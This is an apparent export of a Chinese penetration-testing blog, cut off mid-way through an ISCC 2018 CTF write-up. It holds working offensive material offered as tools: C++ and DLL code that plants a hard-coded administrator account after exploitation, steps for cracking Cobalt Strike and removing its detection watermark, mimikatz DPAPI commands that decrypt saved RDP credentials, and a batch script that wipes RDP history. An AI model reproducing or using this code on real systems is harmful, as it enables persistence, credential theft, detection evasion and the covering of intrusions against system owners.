      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【编程】创建用户，并添加至管理组]]></title>
    <url>%2F2018%2F11%2F%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%EF%BC%8C%E5%B9%B6%E6%B7%BB%E5%8A%A0%E8%87%B3%E7%AE%A1%E7%90%86%E7%BB%84%2F</url>
    <content type="text"><![CDATA[摘要: 因有些需求，需要本地/远程添加用户。所以直接选择Windows API函数进行编写，因为部分杀软限制了CMD。123456程序名称：添加系统用户.exe(也可创建dll)编译平台：VS2015 C# (.NET Framework v4.0)、Windows 7 Ultimate x64编写语言：C++ (C#存在版本限制)测试条件：以管理员运行测试工具：zzz_exploit or other测试平台：xp-x64、win2003-x86、win7-x64、win2008-x64、win10-x64(火绒) --&gt;均可成功添加 0x00 思路及原理一）编程思路使用NetUserAdd函数添加普通权限的用户并指定级别。123456NET_API_STATUS NET_API_FUNCTION NetUserAdd( LPCWSTR servername, // 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机 DWORD level, // 指定数据的信息级别。 LPBYTE buf, // 指向指定数据的缓冲区的指针。此数据的格式取决于level参数的值。 LPDWORD parm_err); 使用NetLocalGroupAddMembers函数将现有用户账号添加到现有本地组。1234567NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers( LPCWSTR servername, // 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机 LPCWSTR groupname, // 指向常量字符串的指针，该字符串指定将向其添加指定用户或全局组的本地组的名称。 DWORD level, // 指定数据的信息级别。 LPBYTE buf, // 指向包含新本地组成员数据的缓冲区的指针。此数据的格式取决于level参数的值。 DWORD totalentries // 指定buf参数指向的缓冲区中的条目数。); 二）编写思路 定义USER_INFO_1 结构体该结构包含用户的账户信息，包括账户名，密码数据，权限级别和路径到用户的主目录。 调用NetUserAdd添加普通权限账户 调用NetLocalGroupAddMembers添加到管理员组 0x01 代码一）exe生成123456789101112131415161718192021222324252627282930313233343536373839// UserInfoAdd.cpp : 定义控制台应用程序的入口点。//#include "stdafx.h"#ifndef UNICODE#define UNICODE#endif#pragma comment(lib,"netapi32")#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;lm.h&gt;int wmain(int argc, wchar_t *argv[])&#123; // 定义USER_INFO_1结构体 USER_INFO_1 UserInfo; DWORD dwLevel = 1; DWORD dwError = 0; UserInfo.usri1_name = L"Admins"; // 账户 UserInfo.usri1_password = L"P@ssword233"; // 密码 UserInfo.usri1_priv = USER_PRIV_USER; UserInfo.usri1_home_dir = NULL; UserInfo.usri1_comment = NULL; UserInfo.usri1_flags = UF_SCRIPT; UserInfo.usri1_script_path = NULL; //添加名为Admins的用户,密码为P@ssword233 NetUserAdd(NULL, dwLevel, (LPBYTE)&amp;UserInfo, &amp;dwError); // 添加用户到administrators组 LOCALGROUP_MEMBERS_INFO_3 account; account.lgrmi3_domainandname = UserInfo.usri1_name; NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&amp;account, 1); return 0;&#125; 二）dll生成1234567891011121314151617181920212223242526272829#ifndef UNICODE#define UNICODE#endif#pragma comment(lib,"netapi32")#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;tchar.h&gt; #include &lt;iostream&gt;#include &lt;lm.h&gt;#include &lt;stdlib.h&gt;#include &lt;atlimage.h&gt;int NetUserAdd()&#123; ....&#125;BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) &#123; switch (dwReason) &#123; case DLL_PROCESS_ATTACH: NetUserAdd(); break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 在编译代码的时候，选择MT，所有的依赖文件都会编进去。 0x02 备注123456支持最低客户端: Windows 2000 Professional [仅desktop apps]支持最低服务器: Windows 2000 Server [仅desktop apps]目标平台: WindowsHeader: lmaccess.h (include Lm.h)Library: Netapi32.libDLL: Netapi32.dll]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>Tools</tag>
        <tag>编程之道</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透技巧】CobaltStrike 3.12 破解]]></title>
    <url>%2F2018%2F10%2F%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91CobaltStrike%203.12%20%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[听说有更新，所以就拿来看看，按照 3.8 的破解流程。 0x00 Cobalt Strike3.12 下载原版：https://github.com/microidz/Cobaltstrike-Trial 校验：https://verify.cobaltstrike.com/ xor.bin：https://github.com/verctor/CS_xor64 破解记录 0x01 文件文件位置12345678common/License.class # 修改时间及提示框common/ArtifactUtils.class # 去除后门特征指纹server/ProfileEdits.class # 去除后门特征指纹aggressor/dialogs/ListenerDialog.class # 去除listener个数限制aggressor/AggressorClient.class # 标题栏修改resources/template.x64.ps1、template.x86.ps1 # 去除后门特征指纹resources/xor.bin # 放入xor.bin文件resources/xor64.bin # 放入xor.bin文件 0x02 License.class首先将cobaltstrike.jar以压缩包格式打开，复制License.class出来，然后运行jad.exe License.class，jad目录下就会生成License.jad，修改后缀为Java，即是源码文件了。 这里将提供两种破解思路。 (1) 直接修改试用时间 123private static long life = 21L;将21天的试用期修改成private static long life = 99999L; (2) 修改isTrail的判断逻辑 123456789 public static boolean isTrial() &#123; return true; &#125;修改成 public static boolean isTrial() &#123; return false; &#125; 往下：12345678910public static void checkLicenseGUI(Authorization auth)&#123; ....&#125;修改成public static void checkLicenseGUI(Authorization authorization)&#123;&#125;同理public static void checkLicenseConsole(Authorization authorization) 0x03 去除listener个数限制文件在aggressor/dialogs/ListenerDialog.class 去除1234if(Listener.isEgressBeacon(payload) &amp;&amp; DataUtils.isBeaconDefined(datal) &amp;&amp; !name.equals(DataUtils.getEgressBeaconListener(datal))) &#123; DialogUtils.showError("You may only define one egress Beacon per team server.\nThere are a few things I need to sort before you can\nput multiple Beacon HTTP/DNS listeners on one server.\nSpin up a new team server and add your listener there."); &#125; else 0x04 后门特征指纹试用版本的Cobalt Strike有固定的指纹： 1X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* 存在后门特征指纹的其中几个地方 common/ArtifactUtils.class 1packer.addString("X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"); resources/template.x64.ps1、template.x86.ps1 1$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' server/ProfileEdits.class 12345c2profile.addCommand(".http-get.server", "!header", "X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".http-post.server", "!header", "X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".http-stager.server", "!header", "X-Malware: X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".stage.transform-x86", "append", "X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");c2profile.addCommand(".stage.transform-x64", "append", "X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"); 0x05 结果最后使用1javac -classpath cobaltstrike.jar xxxx.java 进行编译 0x06 参考https://xz.aliyun.com/t/2170https://www.cnblogs.com/ssooking/p/9825917.htmlhttps://www.bilibili.com/video/av34171888/https://github.com/Lz1y/cobalt_strike_3.12_patch]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>Tools</tag>
        <tag>渗透技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【域渗透】批量 Net User Uname /domain]]></title>
    <url>%2F2018%2F08%2F%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%89%B9%E9%87%8FNet-User%2F</url>
    <content type="text"><![CDATA[域内批量执行 net user Uname /domain 0x00使用场景在渗透测试中，需要查找域内某用户的机器所在，必须得确定目标人物所对应的域用户。查找域用户对应的 Full Name 信息，从而确认目标任务对应的域用户。 0x01 代码代码其实很简单，使用 C# 进行编写，可自行编译。 将所有域用户导入user.txt中（每个域用户一行），遍历文件中的用户，然后调用系统cmd命令执行net user Uname /domain，将运行结果进行输出，可根据自己需求进行二次修改（线程、正则、输出保存）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182using System;using System.IO;using System.Text;using System.Text.RegularExpressions;namespace domain&#123; class Program &#123; static void Main(string[] args) &#123; Console.WriteLine("Tools By RcoIl \r"); string currentDirectory = Environment.CurrentDirectory; string text = currentDirectory + "\\user.txt"; // 文件绝对路径 if (!File.Exists(text)) &#123; Console.WriteLine("File not found " + text); &#125; else &#123; FileStream stream = new FileStream(text, FileMode.Open, FileAccess.Read); // 打开文本 try &#123; StreamReader streamReader = new StreamReader(stream, Encoding.Default); // 实例化 try &#123; while (!streamReader.EndOfStream) // 读取文本 &#123; string text2; if ((text2 = streamReader.ReadLine()) != null &amp;&amp; text2.Length != 0) &#123; string id = text2; Program.Check(id); &#125; &#125; &#125; finally &#123; if (streamReader != null) &#123; ((IDisposable)streamReader).Dispose(); &#125; &#125; &#125; finally &#123; if (stream != null) &#123; ((IDisposable)stream).Dispose(); &#125; &#125; Console.WriteLine("============================================================"); Console.WriteLine("Finish!"); GC.Collect(); &#125; &#125; public static void Check(string id) &#123; System.Diagnostics.ProcessStartInfo proccessStartInfo = new System.Diagnostics.ProcessStartInfo("net", "user " + id + " /domain"); proccessStartInfo.CreateNoWindow = true; System.Diagnostics.Process proc = new System.Diagnostics.Process &#123; StartInfo = proccessStartInfo &#125;; proc.StartInfo.RedirectStandardOutput = true; // 由调用程序获取输出信息 proc.StartInfo.UseShellExecute = false; // 是否使用操作系统shell启动 proc.StartInfo.CreateNoWindow = true; // 不显示程序窗口 proc.Start(); // 启动程序 string outlist = proc.StandardOutput.ReadToEnd(); // 获取cmd窗口的输出信息 Regex reg = new Regex(".*ame.*"); MatchCollection result = reg.Matches(outlist); Console.WriteLine("============================================================"); foreach (Match match in result) &#123; Console.WriteLine(match); &#125; proc.WaitForExit(); // 等待程序执行完退出进程 proc.Close(); &#125; &#125;&#125; 运行效果图： 0x02 改进 (20190418)由于上面的代码略蠢，所以我决定将它进行改进。 使用 System.DirectoryServices.ActiveDirectory 列举用户； 使用 msvcrt.dll 执行系统命令； 1) powershell 列举用户列表这份代码在网上已经很成熟了，可自行查阅。 12345678910111213141516171819202122232425262728293031323334353637function DomainUserList&#123; # 获取当前 Domain 值 $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain) $DirEntry = New-Object System.DirectoryServices.DirectoryEntry $UserSearcher.SearchRoot = $DirEntry $lockoutThreshold = [int]$DirEntry.lockoutThreshold.Value Write-Host -ForegroundColor "yellow" "[*] 当前域的锁定阈值是 $($lockoutThreshold)." $minPwdLength = [int]$DirEntry.minPwdLength.Value Write-Host -ForegroundColor "yellow" "[*] 当前域的最小密码长度是 $($minPwdLength)." # 删除已禁用的用户列表 if ($RemoveDisabled) &#123; # 参考资料：http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/ Write-Host -ForegroundColor "yellow" "[*] 从列表中删除已禁用的用户." $UserSearcher.filter = "(&amp;(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2))" &#125; else &#123; $UserSearcher.filter = "(&amp;(objectCategory=person)(objectClass=user))" &#125; # 在结果中抓取1000次 $UserSearcher.PageSize = 100 $AllUserObjects = $UserSearcher.FindAll() Write-Host -foregroundcolor "yellow" ("[*] 从当前 AD 域中成功收集了 " + $AllUserObjects.count + " 个用户") return $AllUserObjects.Properties.samaccountname&#125;DomainUserList 将代码转换成C#代码，效果如下 3) 成品其实还是有点麻瓜。 github: DomainUserList 0x03 总结在域内使用dsquery查找的信息是有限的，所以需要相应的辅助工具，这个工具存在的意义就是人物与域用户之间的确认。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>域渗透</tag>
        <tag>C#</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透技巧】关于 windows的 RDP连接记录]]></title>
    <url>%2F2018%2F05%2F%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[关于 windows的 RDP连接历史记录处理，此处仅作为笔记记录，并非原创。 0x00 前言每次成功连接到远程主机时，RDP 客户端都会保存远程主机的名称（或IP地址）以及用于登陆的用户名。再次启动mstsc.exe时，可以直接从列表中选择远程RDP服务器的名称，并且客户端已自动填写用于登陆的用户名。 从安全角度来讲，这是极不安全的。 0x01 获取RDP连接历史记录PS：代理连接并不存在任何的 RDP 外连记录。 至于获得历史记录的思路及细节实现思路，请转至三好学生师傅的博客，此处仅作为记录。 1234567891011121314151617181920212223242526272829303132333435363738&lt;#.SYNOPSISThis script will list the logged-in users' RDP Connections History.Author: 3gstudent@3gstudentLicense: BSD 3-Clause#&gt;$AllUser = Get-WmiObject -Class Win32_UserAccountforeach($User in $AllUser)&#123; $RegPath = "Registry::HKEY_USERS\"+$User.SID+"\Software\Microsoft\Terminal Server Client\Servers\" Write-Host "User:"$User.Name Write-Host "SID:"$User.SID Write-Host "Status:"$User.Status Try &#123; $QueryPath = dir $RegPath -Name -ErrorAction Stop &#125; Catch &#123; Write-Host "No RDP Connections History" Write-Host "----------------------------------" continue &#125; foreach($Name in $QueryPath) &#123; Try &#123; $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint Write-Host "User:"$User Write-Host "Server:"$Name &#125; Catch &#123; Write-Host "No RDP Connections History" &#125; &#125; Write-Host "----------------------------------" &#125; 根据三好学生师傅的 PowerShell 改写了 C# 版本，虽然代码不怎么好看。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798using System;using Microsoft.Win32;namespace SavedRDPConnections&#123; class Program &#123; public static string GetRegValue(string hive, string path, string value) &#123; string regKeyValue = ""; if (hive == "HKCU") &#123; var regKey = Registry.CurrentUser.OpenSubKey(path); if (regKey != null) &#123; regKeyValue = String.Format("&#123;0&#125;", regKey.GetValue(value)); &#125; return regKeyValue; &#125; else if (hive == "HKU") &#123; var regKey = Registry.Users.OpenSubKey(path); if (regKey != null) &#123; regKeyValue = String.Format("&#123;0&#125;", regKey.GetValue(value)); &#125; return regKeyValue; &#125; else &#123; var regKey = Registry.LocalMachine.OpenSubKey(path); if (regKey != null) &#123; regKeyValue = String.Format("&#123;0&#125;", regKey.GetValue(value)); &#125; return regKeyValue; &#125; &#125; public static string[] GetRegSubkeys(string hive, string path) &#123; try &#123; Microsoft.Win32.RegistryKey myKey = null; if (hive == "HKLM") &#123; myKey = Registry.LocalMachine.OpenSubKey(path); &#125; else if (hive == "HKU") &#123; myKey = Registry.Users.OpenSubKey(path); &#125; else &#123; myKey = Registry.CurrentUser.OpenSubKey(path); &#125; String[] subkeyNames = myKey.GetSubKeyNames(); return myKey.GetSubKeyNames(); &#125; catch &#123; return new string[0]; &#125; &#125; public static void ListSavedRDPConnections() &#123; string[] SIDs = Registry.Users.GetSubKeyNames(); foreach (string SID in SIDs) &#123; if (SID.StartsWith("S-1-5") &amp;&amp; !SID.EndsWith("_Classes")) &#123; string[] subkeys = GetRegSubkeys("HKU", String.Format("&#123;0&#125;\\Software\\Microsoft\\Terminal Server Client\\Servers", SID)); if (subkeys != null) &#123; Console.WriteLine("\r\n\r\n=== Saved RDP Connection Information (&#123;0&#125;) ===", SID); foreach (string host in subkeys) &#123; string username = GetRegValue("HKCU", String.Format("Software\\Microsoft\\Terminal Server Client\\Servers\\&#123;0&#125;", host), "UsernameHint"); Console.WriteLine("\r\n Server : &#123;0&#125;", host); if (username != "") &#123; Console.WriteLine(" User : &#123;0&#125;", username); &#125; &#125; &#125; &#125; &#125; &#125; static void Main(string[] args) &#123; ListSavedRDPConnections(); &#125; &#125;&#125; 0x02 破解RDP连接凭证破解RDP连接凭证的前提是用户在连接远程主机时勾选了保存保存凭证。 1、查找本地的Credentials1dir /a %userprofile%\AppData\Local\Microsoft\Credentials\* 2、使用mimikatz进行操作1mimikatz dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6 得到的内容为： 123456789101112131415161718192021222324mimikatz # dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6**BLOB** dwVersion : 00000001 - 1 guidProvider : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125; dwMasterKeyVersion : 00000001 - 1 guidMasterKey : &#123;ffc994a1-de8d-4304-9416-31e587f7a8ca&#125; dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 00000030 - 48 szDescription : Local Credential Data algCrypt : 00006610 - 26128 (CALG_AES_256) dwAlgCryptLen : 00000100 - 256 dwSaltLen : 00000020 - 32 pbSalt : 00fed8ca7ec6d44585dd1fbd8b57e77b6ab0cf318ec5d52d09fd0694ffb89ccb dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 0000800e - 32782 (CALG_SHA_512) dwAlgHashLen : 00000200 - 512 dwHmac2KeyLen : 00000020 - 32 pbHmack2Key : b49ef55f909fa503eda37ddc797c83c99df983920bfb4628e07aac5cb32bb530 dwDataLen : 000000b0 - 176 pbData : 4083f8f501b999a35c4aa57ce732bf52d30a6e604dac5a91b6fd3e65660c52a536025c5126f0d12b85044498deef08a8688b3459f49514ed6ae46271a1cb4cd0e70845d9b6beccbcbe85dead0fb7c80b4f7810add87b75c48592fcbfbbfd94fa4eee8004f8cf6d9619ef4b9af643f4c9ef0e8a2a5b0cd00530a5638cfd114fee4b735ac12eef2c7e6a0364845eb0ee4b3ab121e33324f8d5af48f3422bd47a76ab5e9e9e5a1a383e22fff8bf851b6a2a dwSignLen : 00000040 - 64 pbSign : 7c8dbe7991c6af4d3bfc9f808790a0904738d0ca227bc2ee20ee26cbf06487dd2679e932b27ea0c0cbbe590ee6430641605d7001b2158c8873c5d6a09a9855a8 接下来需要使用的就是guidMasterKey、pbData数据。pbData是凭据的加密数据，guidMasterKey是凭据的GUID 3、使用sekurlsa::dpapi 根据目标凭据GUID: {ffc994a1-de8d-4304-9416-31e587f7a8ca}找到其关联的MasterKey，这个MasterKey就是加密凭据的密钥，即解密pbData所必须的东西。 4、解密命令为： 1dpapi::cred /in:C:\Users\allen\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6 /masterkey:e01320a53bf9d57da1163c7723a5b3901df5a3fc8e504fc021def2637d19d34c0084a3ac2a0daab3fb9af3f98c48a9a901627dc4b10db087cb357e1d2f8aa18c 0x03 清除RDP连接历史记录清除就相对简单一些。 1HKCU:\Software\Microsoft\Terminal Server Client\ 针对上述的Default、Server，对其表项进行删除 tips：由于在删除Server表项的时候无法一次选择所有表项，因为可以直接删除整个Server再新建。 除了删除注册表之外，要需要删除默认的RDP连接文件 1234567@echo offreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f # 删除Default中的所有值reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f # 删除整个Serversreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" 重新创建删除的注册表项cd %userprofile%\documents\ # 转到Default.rdp文件目录attrib Default.rdp -s -h # 更改Default.rdp文件属性，默认情况下它是隐藏del Default.rdp # 删除文件Default.rdp文件 注意：在某些情况（比如系统盘空间不足）下，Document文件夹会从%userprofile%\documents\移动，所以特殊情况下，需要手动查找Default.rdp 0x04 关于 连入 记录上面几点都是根据本地主机连接远程主机的相关记录操作。第四点则是记录关于远程主机的操作。 12 0x05参考获得Windows系统的远程桌面连接历史记录 mimikatz获取本地Credentials 破解远程终端凭据，获取服务器密码 How to Clear RDP Connections History in Windows]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>系统安全</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【CTF】ISCC-2018]]></title>
    <url>%2F2018%2F05%2F%E3%80%90CTF%E3%80%91ISCC-2018%2F</url>
    <content type="text"><![CDATA[又一年，不过今年的质量有些….. 0x01MiscWhat is that？附件地址：What is that 查看图片信息，使用传统的方法解答没见效，使用TweakPNG查看图片信息。 将高度调整即可得到flag。 秘密电报查看附件，内容为： 12秘密电报：知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA 老司机一看就是培根密码了，flag为：ILIKEISCC Where is the FLAG？附件地址：Where is the FLAG 题目：不只是Logo 查看详细信息，发现是由Adobe Fireworks CS5保存出来的图片，那就用Adobe Fireworks CS5打开。 调整画布大小，开始摆，得出一张二维码。flag{a332b700-3621-11e7-a53b-6807154a58cf} 一只猫的心思附件地址：一只猫的心思 题目：你能读懂它的心思吗？ 使用foremost抽离图片，得到一个doc文件，打开，内容为： 1名西三陵帝焰数诵诸山众參哈瑟倒陰捨劫奉惜逝定雙月奉倒放足即闍重号貧老诵夷經友利普过孕北至花令藐灯害蒙能羅福羅夢开雙禮琉德护慈積寫阿璃度戏便通故西故敬于瑟行雙知宇信在礙哈数及息闍殺陵游盧槃药諦慈灯究幽灯豆急彌貧豆親诵梭量树琉敬精者楞来西陰根五消夢众羅持造彌六师彌怖精僧璃夫薩竟祖方夢訶橋經文路困如牟憐急尼念忧戏輸教乾楞能敬告树来楞殊倒哈在紛除亿茶涅根輸持麼阿空瑟稳住濟号他方牟月息盡即来通貧竟怖如槃精老盡恤及游薩戏师毒兄宝下行普鄉释下告劫惜进施盡豆告心蒙紛信胜东蒙求帝金量礙故弟帝普劫夜利除積众老陀告沙師尊尼捨惜三依老蒙守精于排族祖在师利寫首念凉梭妙經栗穆愛憐孝粟尊醯造解住時刚槃宗解牟息在量下恐教众智焰便醯除寂想虚中顛老弥诸持山諦月真羅陵普槃下遠涅能开息灯和楞族根羅宝戒药印困求及想月涅能进至贤金難殊毘瑟六毘捨薩槃族施帝遠念众胜夜夢各万息尊薩山哈多皂诵盡药北及雙栗师幽持牟尼隸姪遠住孕寂以舍精花羅界去住勒排困多閦呼皂難于焰以栗婦愛闍多安逝告槃藐矜竟孕彌弟多者精师寡寫故璃舍各亦方特路茶豆積梭求号栗怖夷凉在顛豆胜住虚解鄉姪利琉三槃以舍劫鄉陀室普焰于鄉依朋故能劫通 到与佛论禅进行解密，得到一串16进制字符串，接下来： 116进制--&gt;文本--&gt;base64解密--&gt;base32解密--&gt;文本--&gt;base64解密--&gt;base32解密--&gt;文本 得到F1a9_is_I5cc_ZOl8_G3TP01NT 暴力XX不可取附件地址：暴力XX不可取 题目：A同学要去参加今年的ISCC。大赛在即，A同学准备了一批暴力破解工具，你感觉这个靠谱吗？ 下载附件直接能解压，flag.txt的内容为vfppjrnerpbzvat，凯撒解密得出flag为：isccwearecoming 重重谍影题目：这是一道脑洞题，简单的要命。层层迷雾之后就是答案，刹那便是永恒。南无阿弥陀佛。 1Vm0wd2QyVkZOVWRXV0doVlYwZG9WVll3WkRSV2JGbDNXa1JTVjAxWGVGWlZNakExVjBaS2RHVkljRnBXVm5CUVZqQmtTMUl4VG5OaFJtUlhaV3RHTkZkWGRHdFRNVXB6V2toV2FsSnNjRmhhVjNoaFYxWmFjMWt6YUZSTlZtdzBWVEo0YzJGR1NuTlhiR2hYWVd0d2RsUnRlR3RqYkdSMFVteFdUbFp0ZHpCV2EyTXhVekZSZUZkc1ZsZGhlbXhoVm01d1IyTldjRVZTYlVacVZtdHdlbGRyVlRWVk1ERldZMFZ3VjJKR2NIWlpWRXBIVWpGT1dXSkhhRlJTVlhCWFZtMDFkMUl3TlhOVmJGcFlZbGhTV1ZWcVFURlRWbEY0VjIxR2FGWnNjSGxaYWs1clZqSkdjbUo2UWxwV1JWcDZWbXBHVDJNeGNFaGpSazVZVWxWd1dWWnRNVEJXTVUxNFdrVmtWbUpHV2xSWlZFNVRWVVpzYzFadVpGUmlSbHBaVkZaU1ExWlhSalpTYTJSWFlsaENVRll3V21Gak1XUnpZVWRHVTFKV2NGRldha0poV1ZkU1YxWnVTbEJXYldoVVZGUktiMDB4V25OYVJFSm9UVlpXTlZaSE5VOVdiVXB5WTBaYVdtRXhjRE5aTW5oVFZqRmFkRkpzWkU1V2JGa3dWbXhrTUdFeVJraFRiRnBYWVd4d1dGWnFUbE5YUmxsNVRWVmFiRkp0VW5wWlZWcFhZVlpLZFZGdWJGZGlXRUpJV1ZSS1QxWXhTblZWYlhoVFlYcFdWVmRYZUZOamF6RkhWMjVTYWxKWVVrOVZiVEUwVjBaYVNFNVZPVmRXYlZKS1ZWZDRhMWRzV2taWGEzaFhUVlp3V0ZwR1pFOVRSVFZZWlVkc1UyRXpRbHBXYWtvd1lURkplRmR1U2s1V1ZscHdWVzB4VTFac1duUk5WazVPVFZkU1dGZHJWbXRoYXpGeVRsVndWbFl6YUZoV2FrWmhZekpPUjJKR1pGTmxhMVYzVjJ0U1IyRXhUa2RWYmtwb1VtdEtXRmxzWkc5a2JHUllaRVprYTJKV1ducFhhMXB2Vkd4T1NHRklRbFZXTTJoTVZqQmFZVk5GTlZaa1JscFRZbFpLU0ZaSGVGWmxSbHBYVjJ0YVQxWldTbFpaYTFwM1dWWndWMXBHWkZSU2EzQXdXVEJWTVZZeVNuSlRWRUpYWWtad2NsUnJXbHBsUmxweVdrWm9hVkpzY0ZsWFYzUnJWVEZaZUZkdVVtcGxhMHB5VkZaYVMxZEdXbk5oUnpsWVVteHNNMWxyVWxkWlZscFhWbGhvVjFaRldtaFdha3BQVWxaU2MxcEhhRTVpUlc4eVZtdGFWMkV4VVhoYVJXUlVZa2Q0Y1ZWdGRIZGpSbHB4VkcwNVZsWnRVbGhXVjNSclYyeGFjMk5GYUZkaVIyaHlWbTB4UzFaV1duSlBWbkJwVW14d2IxZHNWbUZoTWs1elZtNUtWV0pHV2s5V2JHaERVMVphY1ZKdE9XcE5WbkJaVld4b2IxWXlSbk5UYldoV1lURmFhRlJVUm1GamJIQkhWR3hTVjJFelFqVldSM2hoWVRGU2RGTnJXbXBTVjFKWVZGWmFTMUpHYkhGU2JrNVlVbXR3ZVZkcldtdGhWa2w1WVVjNVYxWkZTbWhhUkVaaFZqRldjMWRzWkZoU01taFFWa1phWVdReFNuTldXR3hyVWpOU2IxVnRkSGRXYkZwMFpVaE9XbFpyY0ZsV1YzQlBWbTFXY2xkdGFGWmlXRTE0Vm0xNGExWkdXbGxqUms1U1ZURldObFZyVGxabGJFcENTbFJPUlVwVVRrVSUzRA== 一直base64解码，得到 1U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc= 以U2FsdGVkX1开头的密文是AES加密，，然后使用openssl进行解密，顺带猜密码，最后在encrypt解密得到 1缽娑遠呐者若奢顛悉呐集梵提梵蒙夢怯倒耶哆般究有栗 到与佛论禅进行解密得出flag为：把我复制走 凯撒十三世题目：凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。 这个比较明显，就是取凯撒的13行，也就是rot13，结果是roqtp697t95j3，再进行键盘密码解密，得到flag为：yougotme，唯一的小坑就是对这个键盘密码的时候。 有趣的ISCC附件地址有趣的ISCC 题目：在ISCC的平台上，跟小伙伴们一起闯关，是不是很有趣啊！！！猜猜我在图片中隐藏了什么？ 查看图片信息，最末尾发现了 